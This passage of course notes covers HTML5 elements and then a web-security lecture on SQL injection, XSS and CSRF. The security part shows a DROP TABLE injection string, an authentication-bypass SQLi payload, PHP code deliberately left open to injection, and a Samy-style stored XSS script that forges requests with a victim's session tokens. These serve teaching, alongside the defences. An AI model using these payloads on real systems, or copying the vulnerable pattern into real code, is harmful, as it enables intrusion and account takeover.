Each web page must begin with a `DOCTYPE` declaration telling the browser which version of HTML the page uses.

```html
<!-- HTML5 — simplest form -->
<!DOCTYPE html>

<!-- HTML 4.01 Transitional -->
<!DOCTYPE html PUBLIC
  "-//W3C//DTD HTML 4.01 Transitional//EN"
  "http://www.w3.org/TR/html4/loose.dtd">

<!-- XHTML 1.0 Transitional -->
<!DOCTYPE html PUBLIC
  "-//W3C//DTD XHTML 1.0 Transitional//EN"
  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<!-- XHTML 1.0 Strict -->
<!DOCTYPE html PUBLIC
  "-//W3C//DTD XHTML 1.0 Strict//EN"
  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
```

HTML5 DOCTYPE is simple and case-insensitive — recommended for all new pages.

### HTML Base Structure

```html
<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8">
    <title>This is the Title of the Page</title>
  </head>
  <body>
    <h1>This is the body of the Page</h1>
    <p>Anything within the body of a web page is displayed
    in the main browser window.</p>
  </body>
</html>
```

| Element | Role |
|---------|------|
| `<html>` | Root element — contains all other elements |
| `<head>` | Document metadata — not displayed |
| `<title>` | Page title — shown in browser tab |
| `<body>` | Visible page content |

### Meta Elements

`<meta>` is an **empty element** (no closing tag); placed inside `<head>`; not displayed by the browser.

Common uses:

```html
<meta charset="utf-8">                           <!-- character encoding -->
<meta name="keywords" content="web, html5">      <!-- search engine keywords -->
<meta name="author" content="John Smith">        <!-- document author -->
<meta name="description" content="Page about..."> <!-- page description -->
<meta http-equiv="refresh" content="30">          <!-- refresh every 30s -->
<meta name="viewport" content="width=device-width, initial-scale=1"> <!-- responsive -->
```

Metadata used by: browsers (display), search engines (indexing), other web services.

### Document Structure Elements

| Element | Description |
|---------|-------------|
| `<html>` | Root element |
| `<head>` | Document head — metadata |
| `<body>` | Document body — content |
| `<meta>` | Machine-readable page information |
| `<title>` | Page title (shown in tab) |

---

## Markup Types

### Structural Markup

Gives information about the **structure** of a document — divisions, titles, sections, paragraphs.

Example: `<h1>` changes formatting AND indicates heading level structure.

- HTML4 used generic `<div>` and `<span>` as structure containers
- HTML5 introduces semantic structural elements: `<header>`, `<footer>`, `<nav>`, `<article>`, `<section>`, `<aside>`
- These carry both structural and **semantic** meaning

### Semantic Markup

Text elements that add **extra information** about content without necessarily changing structure.

- `<h1>` — most important heading
- `<em>` — emphasis
- `<blockquote>` — block quotation

> [!Important] Semantic vs Presentational Use of Tags
> HTML tags must be chosen for their **semantic meaning**, not their visual appearance.
> - Use `<h1>` because the text *is* a main heading — not because you want big text
> - Use `<strong>` because text *is* important — not because you want it bold
> - For appearance: **use CSS**
>
> **Intuition:** Screen readers, search engines, and accessibility tools rely on semantic meaning. Misusing `<h1>` for styling breaks accessibility and SEO.

### Block and Inline Elements

![[html5-block-inline.jpg|580]]
*Figure 1: Difference between block and inline elements in HTML*

| Type | Behavior | Examples |
|------|----------|---------|
| **Block** | Always starts on new line; takes full available width | `<h1>`–`<h6>`, `<p>`, `<ul>`, `<li>`, `<div>` |
| **Inline** | Sits within block element; does not start new line | `<a>`, `<em>`, `<img>`, `<span>` |

---

## Main Elements

### Text Elements

#### Headings

Six levels, `<h1>` (largest/most important) to `<h6>` (smallest):

```html
<h1>Main Heading</h1>
<h2>Level 2</h2>
<h3>Level 3</h3>
<h4>Level 4</h4>
<h5>Level 5</h5>
<h6>Level 6</h6>
```

- Browsers add margin before/after automatically
- Search engines use headings to index content — use them semantically

#### Paragraphs

```html
<p>Block of text. Starts on new line.</p>
```

- Block element; browser adds margin before/after
- Cannot contain headings, lists, or other block elements
- Extra spaces/blank lines in HTML are ignored by browser

#### Bold, Italic, Strong, Emphasis

```html
<b>bold</b>            <!-- presentational — visual only -->
<i>italic</i>          <!-- presentational — visual only -->
<strong>important</strong>   <!-- semantic — strong importance -->
<em>emphasis</em>           <!-- semantic — stress emphasis -->
```

`<strong>` and `<em>` are preferred over `<b>` and `<i>` — they carry semantic meaning.

#### Other Text Elements

| Element | Purpose |
|---------|---------|
| `<br />` | Line break inside paragraph (empty element) |
| `<hr />` | Thematic break / horizontal rule (empty element) |
| `<sup>` | Superscript |
| `<sub>` | Subscript |
| `<blockquote>` | Long quote (block-level) |
| `<q>` | Short inline quote |
| `<abbr>` | Abbreviation — full term in `title` attribute |
| `<address>` | Author contact details |
| `<ins>` | Inserted text |
| `<del>` | Deleted text |
| `<s>` | No-longer-accurate text (not deleted) |

### Lists

Three types:

#### Ordered List (`<ol>`)

```html
<ol>
  <li>Chop potatoes into quarters</li>
  <li>Simmer in salted water for 15-20 minutes</li>
  <li>Drain potatoes and mash</li>
</ol>
```

Items are numbered. `CSS list-style-type` changes numbering style.

#### Unordered List (`<ul>`)

```html
<ul>
  <li>1kg King Edward potatoes</li>
  <li>100ml milk</li>
  <li>50g salted butter</li>
</ul>
```

Items have bullet points. `CSS list-style-type` changes bullet style (circle, square, etc.).

#### Description List (`<dl>`)

```html
<dl>
  <dt>Sashimi</dt>
  <dd>Sliced raw fish served with condiments...</dd>
  <dt>Scale</dt>
  <dd>Device to measure weight of ingredients</dd>
  <dd>Technique to remove scales from fish</dd>
</dl>
```

`<dt>` = definition term; `<dd>` = definition description. One term can have multiple definitions.

#### Nested Lists

Place a second `<ul>` or `<ol>` inside an `<li>`. Browser indents and changes bullet style for nested unordered lists.

### Links

#### Anchor Element

```html
<a href="http://www.imdb.com">IMDB</a>
```

`href` = **hypertext reference** — URL of destination. Link text should describe the destination.

#### Absolute vs Relative URLs

| Type | When to use | Example |
|------|-------------|---------|
| **Absolute** | Linking to external sites | `href="http://www.example.com/page.html"` |
| **Relative** | Linking within same site | `href="about.html"` or `href="../images/pic.jpg"` |

#### Special Link Types

```html
<!-- Email link -->
<a href="mailto:jon@example.org">Email Jon</a>

<!-- Telephone link -->
<a href="tel:+18005551212">Call us free</a>

<!-- Open in new window -->
<a href="http://www.imdb.com" target="_blank">IMDB</a>
```

`target="_blank"` is typically used for links to another website so the user can return to the source page more easily. It should be used carefully: new windows/tabs may confuse some users or be perceived as an annoyance.

#### Fragment Links (Intra-page)

Two-part process:
1. Identify destination with `id` attribute (unique per document, starts with letter or `_`)
2. Link to it with `href="#id-value"`

```html
<h1 id="top">Film-Making Terms</h1>
<a href="#arc_shot">Arc Shot</a>
<a href="#prologue">Prologue</a>

<h2 id="arc_shot">Arc Shot</h2>
<p>A shot in which the subject is photographed by an encircling camera</p>
<p><a href="#top">Top</a></p>
```

Link to fragment in another page: `href="http://example.com/page.html#section-id"`

### Images

```html
<img src="figure/quokka.jpg"
     alt="A family of quokka"
     title="Tooltip text"
     width="314"
     height="315" />
```

`<img>` is an **empty element** (no closing tag), inline by default.

| Attribute | Required | Purpose |
|-----------|----------|---------|
| `src` | Yes | URL of image file |
| `alt` | Yes | Text description if image cannot be shown (accessibility) |
| `title` | No | Tooltip on hover |
| `width`, `height` | No | Size in pixels — prefer CSS |

**Placement effect:** `<img>` before `<p>` → image above paragraph; inside `<p>` at start → image left of text; in middle of `<p>` → image inline mid-sentence.

#### Figure and Caption (HTML5)

```html
<figure>
  <img src="figure/quokka.jpg" alt="A family of quokka"
       width="314" height="315" />
  <br />
  <figcaption>The quokka is an Australian marsupial.</figcaption>
</figure>
```

`<figure>` groups image(s) with `<figcaption>`. Pre-HTML5 there was no standard way to associate an image with its caption.

### Tables

#### Basic Structure

```html
<table>
  <tr>
    <th></th>
    <th scope="col">Saturday</th>
    <th scope="col">Sunday</th>
  </tr>
  <tr>
    <th scope="row">Tickets sold:</th>
    <td>120</td>
    <td>135</td>
  </tr>
  <tr>
    <th scope="row">Total sales:</th>
    <td>$600</td>
    <td>$675</td>
  </tr>
</table>
```

| Element | Purpose |
|---------|---------|
| `<table>` | Creates table |
| `<tr>` | Table row |
| `<td>` | Table data cell |
| `<th>` | Table header cell (bold/centered by default) |
| `<caption>` | Table title (displays in browser) |
| `<thead>` | Header row group |
| `<tbody>` | Body row group |
| `<tfoot>` | Footer row group |

#### Spanning

```html
<td colspan="2">Spans 2 columns</td>
<td rowspan="3">Spans 3 rows</td>
<th scope="col">Column header</th>
<th scope="row">Row header</th>
```

### Forms

#### Form Element

```html
<form action="http://www.example.com/subscribe.jsp"
      method="get"
      id="subscription">
  <!-- form controls -->
</form>
```

| Attribute | Required | Values |
|-----------|----------|--------|
| `action` | Yes | URL of server-side handler |
| `method` | No | `get` (default) or `post` |
| `id` | No | Unique identifier |

#### Input Types

```html
<!-- Single-line text -->
<input type="text" name="username" maxlength="30" />

<!-- Password (masked) -->
<input type="password" name="password" maxlength="30" />

<!-- Radio buttons (pick one) -->
<input type="radio" name="genre" value="rock" checked="checked" /> Rock
<input type="radio" name="genre" value="pop" /> Pop

<!-- Checkboxes (pick many) -->
<input type="checkbox" name="service" value="itunes" checked="checked" /> iTunes
<input type="checkbox" name="service" value="spotify" /> Spotify

<!-- File upload -->
<input type="file" name="user-song" />

<!-- Submit button -->
<input type="submit" value="Upload" />

<!-- Image button -->
<input type="image" src="button.jpg" />
```

Radio buttons and checkboxes use the same basic attributes:

| Attribute | Meaning |
|-----------|---------|
| `name` | Groups related controls and provides the variable name sent to the server |
| `value` | Value sent to the server when that option is selected |
| `checked="checked"` | Option selected when the page loads |

For radio buttons, all options answering the same question share the same `name` and the user selects only one option. For checkboxes, the same `name` can identify a group where the user may select more than one option. In both cases, each option should have a distinct `value`.

#### Multi-line Text Area

```html
<textarea name="comments" cols="20" rows="4">
  Default text here (sent if not deleted)
</textarea>
```

Not an empty element. Default text between tags pre-fills the box.

#### Drop-Down List

```html
<select name="devices">
  <option value="ipod">iPod</option>
  <option value="radio" selected>Radio</option>
  <option value="computer">Computer</option>
</select>
```

`<select>` contains two or more `<option>` elements. The text between `<option>` tags is shown to the user; the `value` attribute is what gets sent to the server together with the select control's `name`. The `selected` attribute marks the option selected when the page loads; otherwise the first option is shown.

#### HTML5 Input Types

```html
<input type="date" />       <!-- date picker -->
<input type="range" />      <!-- slider -->
<input type="email" />      <!-- validates email format -->
<input type="url" />        <!-- validates URL format -->
<input type="search" />     <!-- search box -->
<input type="color" />      <!-- color selector -->
```

HTML5 supports **built-in form validation** — browser shows error messages without JavaScript.

#### DataList (HTML5)

```html
<input type="text" list="edulevel" name="education">
<datalist id="edulevel">
  <option value="High School">
  <option value="Bachelors Degree">
  <option value="Masters Degree">
  <option value="PhD">
</datalist>
```

Provides suggested values (dropdown) while still allowing free-text input. `list` attribute on `<input>` references `id` of `<datalist>`.

#### id vs name Attributes

| Attribute | Scope | Purpose |
|-----------|-------|---------|
| `id` | All HTML elements | Unique identifier; used by CSS and JavaScript |
| `name` | Form controls | Variable name for name/value pair sent to server |

All form controls (except submit) must have `name` — the server-side handler uses `name` to identify submitted values. `id` values must be unique in the page; `name` values do **not** have to be unique because groups such as radio buttons and checkboxes intentionally share the same variable name.

---

## Extra Markup

### Comments

```html
<!-- This comment is not visible in the browser -->
```

Visible in page source; useful for developer notes.

### Class Attribute

```html
<p class="important">High priority text.</p>
<p class="important admittance">Multiple classes (space-separated).</p>
```

- Any element can carry `class`
- Multiple elements can share same `class` value
- Used to target groups with CSS/JavaScript

### div and span

```html
<!-- Block grouping container -->
<div id="sidebar">
  <p>Related links</p>
</div>

<!-- Inline grouping container -->
<p>Some <span class="highlight">important</span> text.</p>
```

| Element | Type | Purpose |
|---------|------|---------|
| `<div>` | Block | Group block-level elements together |
| `<span>` | Inline | Group inline content within a line |

Neither carries semantic meaning — use with `id`/`class` for CSS/JS targeting.

---

## HTML5 New Elements

### New HTML5 Element List

The slides list the following HTML5 elements:

| Category | Elements |
|----------|----------|
| Page structure | `<article>`, `<aside>`, `<footer>`, `<header>`, `<hgroup>`, `<nav>`, `<section>` |
| Media and graphics | `<audio>`, `<canvas>`, `<embed>`, `<source>`, `<track>`, `<video>` |
| Text and annotations | `<bdi>`, `<mark>`, `<rp>`, `<rt>`, `<ruby>`, `<time>`, `<wbr>` |
| Interactive/data widgets | `<command>`, `<datalist>`, `<details>`, `<keygen>`, `<meter>`, `<output>`, `<progress>`, `<summary>` |
| Figures | `<figure>`, `<figcaption>` |

### Semantic Layout Elements

HTML5 introduces named structural elements that replace generic `<div id="...">` patterns:

| Element | Purpose |
|---------|---------|
| `<header>` | Site-wide or section header; contains `<nav>` typically |
| `<footer>` | Site-wide or section footer |
| `<nav>` | Major navigational block |
| `<article>` | Self-contained content (blog post, forum post, comment) |
| `<section>` | Groups related content with common theme; typically has heading |
| `<aside>` | Related but non-essential info (inside `<article>`) or page-wide sidebar (outside) |
| `<hgroup>` | Groups multiple headings for a single section |
| `<figure>` | Image(s) with associated caption |
| `<figcaption>` | Caption for `<figure>` |

```html
<header>
  <h1>Yoko's Kitchen</h1>
  <nav>
    <ul>
      <li><a href="">home</a></li>
      <li><a href="">classes</a></li>
      <li><a href="">about</a></li>
    </ul>
  </nav>
</header>
```

#### Linking Block Elements (HTML5)

HTML5 allows `<a>` to wrap block-level elements — turns entire block into link:

```html
<a href="introduction.html">
  <article>
    <figure>
      <img src="images/bok-choi.jpg" alt="Bok Choi" />
      <figcaption>Bok Choi</figcaption>
    </figure>
    <hgroup>
      <h2>Japanese Vegetarian</h2>
      <h3>Five week course in London</h3>
    </hgroup>
    <p>A five week introduction...</p>
  </article>
</a>
```

### HTML4 vs HTML5 Layout

![[html5-layout-comparison.jpg|560]]
*Figure 2: Comparison between traditional HTML layout and semantic HTML5 layout*

> [!Important] HTML5 Semantic Layout
> Left (HTML4): all structure via `<div id="header">`, `<div id="nav">`, `<div id="sidebar">`, `<div id="footer">`.
> Right (HTML5): `<header>`, `<nav>`, `<aside>`, `<article>`, `<footer>` — self-documenting structure.
> **Intuition:** A developer reading HTML5 markup immediately understands the page regions without inspecting class/id values. Accessibility tools and search engines benefit equally.

### HTML5 APIs

HTML5 standardizes tasks previously requiring proprietary plug-ins:

| API | Purpose |
|-----|---------|
| **Media API** | Playback control of `<video>` and `<audio>` |
| **Session History API** | Expose and manipulate browser history |
| **Offline Web Applications API** | Use web resources while offline |
| **Editing API** | In-browser text editors |
| **Drag and Drop API** | Native drag-and-drop |
| **Canvas API** | 2D drawing via JavaScript |
| **Web Storage API** | Store data in browser cache (localStorage/sessionStorage) |
| **Geolocation API** | Share longitude/latitude |
| **Web Workers API** | Background JavaScript threads |
| **Web Sockets API** | Persistent bidirectional client-server connection |

### Video

```html
<!-- Multiple source formats for cross-browser support -->
<video controls>
  <source src="somevideo.webm" type="video/webm">
  <source src="somevideo.mp4" type="video/mp4">
  Your browser doesn't support HTML5 video.
</video>

<!-- With additional attributes -->
<video src="highlight_reel.mp4"
       width="640" height="480"
       poster="highlight_still.jpg"
       controls
       autoplay>
</video>
```

| Attribute | Purpose |
|-----------|---------|
| `src` | Video file URL |
| `width`, `height` | Player dimensions (px) |
| `poster` | Still image shown before playback |
| `controls` | Show browser's built-in playback controls |
| `autoplay` | Start automatically — **avoid** (poor UX) |
| `<source>` | Alternative format; browser picks first supported |

No single video format is supported by all browsers — provide multiple `<source>` elements.

### Audio

```html
<audio id="soundtrack" controls preload="auto">
  <source src="soundtrack.mp3" type="audio/mp3">
  <source src="soundtrack.ogg" type="audio/ogg">
  <source src="soundtrack.webm" type="audio/webm">
</audio>
```

Same attributes as `<video>` except no `width`, `height`, or `poster`.

**`preload` attribute:**

| Value | Behavior |
|-------|----------|
| `auto` | Fetch audio as soon as page loads |
| `none` | Wait until user presses play |
| `metadata` | Load file info only, not media data |

### Canvas

```html
<canvas width="600" height="400" id="my_first_canvas">
  Your browser does not support HTML5 canvas.
</canvas>
```

- Creates a drawable rectangle on the page
- All drawing done via **JavaScript** (Canvas API): lines, shapes, fills, text, animations
- Content is dynamic — responds to user input at runtime
- Fallback text shown to browsers that don't support canvas

```javascript
const canvas = document.getElementById('my_first_canvas');
const ctx = canvas.getContext('2d');
ctx.fillStyle = '#FF0000';
ctx.fillRect(0, 0, 150, 75);
```

---

## Take Away and Resources

> [!Important] Take Away
> Keep **structure** (`HTML`) separated from **presentation** (`CSS`) and **behaviour** (`JavaScript`). Use HTML elements properly: choose each element according to its semantic meaning, not because of its default visual appearance.

Online resources from the slides:

- HTML5 documentation: `https://html.spec.whatwg.org/multipage/`
- W3C Tutorial: `https://www.w3schools.com/`
- Mozilla Developer Network (MDN): `https://developer.mozilla.org/it/docs/Web/HTML`

---

## Summary Table

| Element/Concept | Type | Key Points |
|----------------|------|-----------|
| `<!DOCTYPE html>` | Declaration | Triggers standards mode; HTML5 form is simplest |
| `<meta charset="utf-8">` | Metadata | Character encoding; empty element |
| `<h1>`–`<h6>` | Block, Structural+Semantic | Use for headings only; affects SEO |
| `<p>` | Block | Cannot contain block elements |
| `<strong>` / `<em>` | Inline, Semantic | Preferred over `<b>` / `<i>` |
| `<br />` / `<hr />` | Empty | Line break / thematic break |
| `<ol>` / `<ul>` / `<dl>` | Block | Ordered / Unordered / Description list |
| `<a href>` | Inline | Links; supports absolute/relative URL, mailto:, tel:, fragment `#id` |
| `<img>` | Inline, Empty | `src` and `alt` required; prefer CSS for sizing |
| `<figure>` + `<figcaption>` | Block | HTML5 image+caption association |
| `<table>` / `<tr>` / `<td>` / `<th>` | Block | `scope` for accessibility; `colspan`/`rowspan` for spanning |
| `<form>` | Block | `action` required; `method` get/post |
| `<input>` | Inline, Empty | Many types: text, password, radio, checkbox, file, submit, date, email, url, color; grouped choices use shared `name` and distinct `value` |
| `<textarea>` | Block | Multi-line text; NOT empty element |
| `<select>` + `<option>` | Inline | Drop-down list; option `value` is sent to server; `selected` sets initial choice |
| `<datalist>` | — | HTML5 suggested-values list for text input |
| `id` / `name` | Attributes | `id` unique in page; `name` identifies form name/value pairs and may be shared by control groups |
| `<div>` / `<span>` | Block / Inline | Generic containers; no semantic meaning |
| `<header>` / `<footer>` | Block, Semantic | HTML5 page/section header+footer |
| `<nav>` | Block, Semantic | Major navigation block |
| `<article>` / `<section>` | Block, Semantic | Self-contained content / thematic group |
| `<aside>` | Block, Semantic | Related but non-essential content / sidebar |
| `<video>` / `<audio>` | Block | HTML5 native media; use multiple `<source>` for compatibility |
| `<canvas>` | Block | 2D drawing via JavaScript Canvas API |
| HTML + CSS + JavaScript | Separation of concerns | HTML = structure, CSS = presentation, JavaScript = behaviour |

## Questions

1. Why does an HTML document start with a `DOCTYPE`, and what makes the HTML5 declaration simpler than older declarations?
2. What responsibilities belong to `<html>`, `<head>`, `<meta>`, `<title>`, and `<body>` in the base document structure?
3. Why is `<meta charset="utf-8">` important, and how do other meta elements support browsers, search engines, and responsive design?
4. How do structural markup and semantic markup differ, and why should tags be chosen for meaning rather than appearance?
5. How do block and inline elements behave differently in normal document flow?
6. Why are `<strong>` and `<em>` preferred over purely presentational tags such as `<b>` and `<i>`?
7. How do ordered, unordered, description, and nested lists express different kinds of information?
8. How do absolute URLs, relative URLs, `mailto:`, `tel:`, and fragment links serve different linking needs?
9. Why are `src` and `alt` essential on images, and how do `<figure>` and `<figcaption>` improve image semantics?
10. How do table elements such as `<tr>`, `<td>`, `<th>`, `<thead>`, `<tbody>`, `scope`, `colspan`, and `rowspan` improve structure and accessibility?
11. How do the `action`, `method`, `name`, and `id` attributes determine how a form is submitted and processed?
12. How do HTML5 input types and `<datalist>` improve forms compared with plain text fields?
13. When should a developer use semantic HTML5 layout elements instead of generic `<div>` and `<span>` containers?
14. What does the HTML4 versus HTML5 layout diagram show about readability, accessibility, and machine interpretation of page structure?
15. How do native `<video>`, `<audio>`, and `<canvas>` reduce the need for plug-ins while still requiring attention to browser support and fallback content?

# Web Security — Web Applications 2025-26

_Source: `12-webapp-2025-26-WebSecurity.pdf` — Web Applications, A.Y. 2025/2026, Francesco L. De Faveri, Padova, April 28th, 2026_

## Table of Contents

- [[#Cybersecurity and Web|Cybersecurity and Web]]
  - [[#Lecture Scope and Lab Material|Lecture Scope and Lab Material]]
  - [[#CIA Triad|CIA Triad]]
  - [[#Web Security|Web Security]]
  - [[#OWASP Top Ten|OWASP Top Ten]]
  - [[#Attack Scenario|Attack Scenario]]
- [[#SQL Injection|SQL Injection]]
  - [[#What is SQL Injection?|What is SQL Injection?]]
  - [[#SQL Special Characters|SQL Special Characters]]
  - [[#How SQL Injection Works|How SQL Injection Works]]
  - [[#Vulnerable Code Example|Vulnerable Code Example]]
  - [[#Protection: Prepared Statements|Protection: Prepared Statements]]
- [[#Cross-Site Scripting (XSS)|Cross-Site Scripting (XSS)]]
  - [[#What is XSS?|What is XSS?]]
  - [[#XSS Types|XSS Types]]
  - [[#Stored XSS Flow|Stored XSS Flow]]
  - [[#XSS Example Code|XSS Example Code]]
  - [[#Protection: XSS|Protection: XSS]]
- [[#Cross-Site Request Forgery (CSRF)|Cross-Site Request Forgery (CSRF)]]
  - [[#What is CSRF?|What is CSRF?]]
  - [[#CSRF Schemas|CSRF Schemas]]
  - [[#CSRF Example Code|CSRF Example Code]]
  - [[#Protection: SameSite Cookie|Protection: SameSite Cookie]]
- [[#Summary Table|Summary Table]]

---

## Cybersecurity and Web

### Lecture Scope and Lab Material

The lecture covers:

1. Cybersecurity and Web Security
2. SQL Injection
3. Cross-Site Scripting (XSS)
4. Cross-Site Request Forgery (CSRF)

Hands-on material from the slides:

- Git repository: `WA-WebSecurity` repo, with Docker containers and README
- VM used for the lab: VM Drive
- Hostname setup:
  - Linux: edit `/etc/hosts` with `sudo nano /etc/hosts`
  - Windows: run Notepad as Administrator and open `C:\Windows\System32\drivers\etc\hosts`
  - Follow the repository `README.md` instructions when modifying the hosts file

### CIA Triad

> [!Important] CIA Triad — Core Cybersecurity Objectives
> Three fundamental security properties every system must guarantee:
>
> | Property | Definition |
> |----------|-----------|
> | **Confidentiality** | Information available only to intended users |
> | **Integrity** | Information is not altered; received exactly as sent |
> | **Availability** | Information is always accessible when the user needs it |
>
> **Intuition:** Break any one of these and the system is compromised — steal data (C), tamper data (I), or knock the server offline (A).

### Web Security

**Web security** = exploitation and defense of websites and web applications.

An attacker must first understand:
- Which components the application uses
- How it expects to interact with users

Common attacker motives: espionage, extortion, theft, fun.

### OWASP Top Ten

**OWASP** (*Open Worldwide Application Security Project*) publishes the **Top 10** — a standard awareness document for developers and web security professionals. First step toward more secure software development.

![[websec-owasp-top10.jpg|520]]
*Figure 1: Evolution of the OWASP Top 10 between 2017, 2021, and 2025*

OWASP Top 10 evolution highlights (2017 → 2021 → 2025):
- **Injection** (SQLi, XSS) — consistently in top 5
- **Broken Access Control** — #1 in 2021 and 2025
- **XSS** — was A07:2017, merged into Injection category in later editions
- **SSRF** — A10:2021 (*Server-Side Request Forgery*); this is distinct from CSRF, which is treated separately in this lecture

Attacks covered in this lecture:
1. SQL Injection
2. Cross-Site Scripting (XSS)
3. Cross-Site Request Forgery (CSRF)

### Attack Scenario

![[websec-scenario.jpg|500]]
*Figure 2: Attack surface of a web application with users, server, and database*

Web application attack surface: users (legitimate and attacker) interact via HTTP with a Web Server, which executes SQL Queries against a Database. Attacker has same HTTP access as normal users — the vulnerability lies in how input is processed.

---

## SQL Injection

### What is SQL Injection?

> [!Important] SQL Injection Definition
> **SQL Injection** is a type of **Code Injection** attack — it exploits vulnerabilities in the interface between a web application and its database.
>
> *"It is an attack that exploits vulnerabilities in the interface of a Web Application."*
>
> Root cause: **untrusted user data mixed with trusted SQL code** to form a SQL statement.
>
> **Intuition:** The database parser cannot distinguish between "intended SQL code" and "injected SQL code" when they arrive as a single string.

> [!Example] xkcd "Bobby Tables" intuition
> The slide references xkcd 327. The attacker's input is a name that contains SQL syntax:
>
> ```sql
> Robert'); DROP TABLE Students;--
> ```
>
> If the application concatenates that string into a SQL query, the injected `DROP TABLE` can be interpreted as SQL code. The lesson is to sanitize database inputs and, more importantly, avoid mixing user data with SQL code.

### SQL Special Characters

Attackers exploit SQL syntax to break out of strings and inject commands:

| Character | Meaning |
|-----------|---------|
| `;` | Query terminator |
| `--` or `#` | Single-line comment (ignores rest of query) |
| `/* */` | Multi-line comment |
| `'` | String delimiter |

Key SQL operations exploitable via injection:

| Operation | Effect |
|-----------|--------|
| `SELECT` | Read records |
| `DROP` | Delete table/database |
| `INSERT INTO` | Add records |
| `UPDATE` | Modify records |

### How SQL Injection Works

![[websec-sqli-mixing.jpg|580]]
*Figure 3: SQL injection problem caused by mixing user input and SQL code*

The core problem: user input and SQL code are mixed together to form a SQL statement.

![[websec-sqli-flow.jpg|580]]
*Figure 4: Flow that sends untrusted data and SQL code to the database parser*

Flow: **Untrusted User Data + Trusted SQL Code → Mixing → SQL Statement → SQL Parser → (Data + SQL Code) → Execution**

The SQL parser cannot distinguish injected SQL from intended SQL — it executes everything.

> [!Warning] SQL Injection Attack Pattern
> Classic authentication bypass:
> ```sql
> -- Intended query:
> SELECT Name, Salary, SSN FROM employee
> WHERE eid = '$eid' AND password = '$pwd'
>
> -- Attacker inputs eid = " ' OR '1'='1' -- "
> -- Resulting query:
> SELECT Name, Salary, SSN FROM employee
> WHERE eid = '' OR '1'='1' -- ' AND password = '...'
> ```
> `'1'='1'` always true; `--` comments out password check → **authentication bypassed**.
> **Mitigazione:** Never concatenate user input into SQL strings.

### Vulnerable Code Example

![[websec-sqli-vulnerable-code.jpg|580]]
*Figure 5: Example of code vulnerable to SQL injection*

```php
$conn = new mysqli("localhost", "root", "seedubuntu", "dbtest");
$sql = "SELECT Name, Salary, SSN
        FROM employee
        WHERE eid = '$eid' and password = '$pwd'";
$conn->query($sql);
$result = $conn->query($sql);
```

Problem: `$eid` and `$pwd` are inserted directly from user input into the SQL string — no sanitization, no separation.

### Protection: Prepared Statements

![[websec-sqli-prepared-stmt.jpg|500]]
*Figure 6: Use of prepared statements to separate SQL code and parameters*

> [!Important] Prepared Statements — Primary Defense
> **Prepared statements** separate code from data: the SQL structure is compiled first with placeholders (`?`), then user data is bound separately. The database parser processes them as two distinct things.
>
> ```php
> $conn = new mysqli("localhost", "root", "seedubuntu", "dbtest");
> $sql = "SELECT Name, Salary, SSN
>         FROM employee
>         WHERE eid = ? and password = ?";
> if ($stmt = $conn->prepare($sql)) {
>     $stmt->bind_param("ss", $eid, $pwd);   // bind as strings
>     $stmt->execute();
>     $stmt->bind_result($name, $salary, $ssn);
> }
> ```
> **Intuition:** `?` is a placeholder — the DB compiles the query structure before it ever sees the user data. Injected SQL syntax in `$eid` is treated as plain string data, never as code.

Additional defense: **filter out / encode** special characters (`;`, `'`, `--`) before use in queries.

---

## Cross-Site Scripting (XSS)

### What is XSS?

> [!Important] XSS Definition
> **XSS** (*Cross-Site Scripting*) is a vulnerability that allows attackers to **inject malicious scripts** (typically JavaScript) into web pages viewed by other users.
>
> The injected script executes in the victim's browser with the **privileges of the trusted site** — same origin, same cookies, same session.
>
> **Intuition:** XSS is the HTML/JS version of SQL Injection — instead of injecting SQL into a database query, you inject script into a page served to other users.

### XSS Types

| Type | Mechanism | Storage |
|------|-----------|---------|
| **Stored XSS** (Persistent) | Script stored in DB, executed when retrieved by any user | Server-side DB |
| **Reflected XSS** | Malicious URL; script reflected by server in response, never stored | Not stored |
| **DOM-Based XSS** | Exploit DOM manipulation vulnerabilities in client-side JS | Client-side only |

### Stored XSS Flow

![[websec-xss-stored-flow.jpg|500]]
*Figure 7: Flow of a stored XSS attack with payload persistence*

**Attack flow:**
1. Attacker submits form containing `<script>malicious code</script>`
2. API receives data and stores it in DB without sanitization
3. Any user who requests that data triggers the API
4. API collects data from DB and sends to client
5. Data injected into the DOM for rendering
6. Browser encounters `<script>` → **interpreted and executed as JavaScript**

The JS code executes when encountered during DOM construction.

### XSS Example Code

![[websec-xss-example-code.jpg|500]]
*Figure 8: Example code and payload for a stored XSS attack*

> [!Example] Stored XSS — Samy Worm pattern
> **Contesto:** Attacker stores malicious JS in their profile on a social network.
> **Codice:**
> ```javascript
> <script type="text/javascript">
> window.onload = function () {
>     var Ajax = null;
>
>     // Get tokens capturing the HTTP request
>     var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
>     var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
>
>     // Construct the HTTP request to add Samy as a friend
>     var sendurl = "http://www.seed-server.com/action/friends/add?friend=59" + ts + token;
>
>     // Create and send Ajax request to add friend
>     Ajax = new XMLHttpRequest();
>     Ajax.open("GET", sendurl, true);
>     Ajax.send();
> }
> </script>
> ```
> **Spiegazione:** When any user views the attacker's profile, this script fires automatically — captures the viewer's session tokens and uses them to send a forged "add friend" request on their behalf. The victim never notices.

### Protection: XSS

> [!Warning] XSS Mitigations
> No single measure is 100% effective. Defense-in-depth:
>
> 1. **Modern frameworks** — React, Angular, Vue have built-in output encoding; use them
> 2. **Output encoding** — encode HTML special characters before rendering user content (`<` → `&lt;`, `>` → `&gt;`, `"` → `&quot;`)
> 3. **HTML Sanitization** — OWASP recommends **DOMPurify** library to strip dangerous tags/attributes
>
> **Mitigazione:** Never insert unsanitized user data into the DOM. Treat all user input as untrusted.

---

## Cross-Site Request Forgery (CSRF)

### What is CSRF?

> [!Important] CSRF Definition
> **CSRF** (*Cross-Site Request Forgery*) tricks an authenticated user's browser into sending an **unauthorized request** to a site where the user is logged in — using the victim's own session cookies.
>
> Key distinction:
> - **Same-site request**: page from Website A sends HTTP request to Website A — normal
> - **Cross-site request**: page from Website A (or attacker's page) sends HTTP request to Website B — CSRF target
>
> **Intuition:** The server cannot distinguish whether a POST request came from the legitimate page or from a malicious page — both carry the victim's cookies.

### CSRF Schemas

**Schema 1** — Normal cross-site request behavior:

![[websec-csrf-schema1.jpg|440]]
*Figure 9: CSRF scenario where cookies are automatically sent by the browser*

Browser holds cookies for both Website A and Website B. A cross-site request from Website A to Website B automatically attaches Website B's cookies.

**Schema 2** — Attacker exploits cross-site requests:

